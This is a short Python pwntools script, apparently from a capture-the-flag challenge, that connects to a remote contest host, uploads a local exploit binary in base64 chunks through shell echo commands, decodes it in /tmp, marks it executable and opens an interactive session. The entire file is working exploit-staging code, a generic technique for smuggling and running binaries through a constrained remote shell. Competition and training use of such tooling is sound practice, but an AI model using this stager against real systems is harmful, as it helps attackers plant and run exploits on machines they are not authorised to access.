from  pwn  import  * 
import  base64 

def  runcmd (cmd): 
    sock.sendlineafter(b"$ " , cmd.encode()) 
    sock.recvline() 


with  open("./solve" ,  "rb")  as  f: 
    payload = base64.b64encode(f.read()).decode()

sock = remote("pwn.ctf.securinets.tn", 8888) 

runcmd( "cd /tmp" ) 
for  i  in  range ( 0 ,  len (payload),  512 ): 
    print (f"Uploading... {i:x} / {len(payload):x}" ) 
    runcmd( 'echo "{}" >> b64exp'.format(payload[i:i+ 512 ])) 

runcmd( "base64 -d b64exp > exploit" ) 
runcmd( "rm b64exp" ) 
runcmd( "chmod +x exploit" ) 
sock.interactive() 
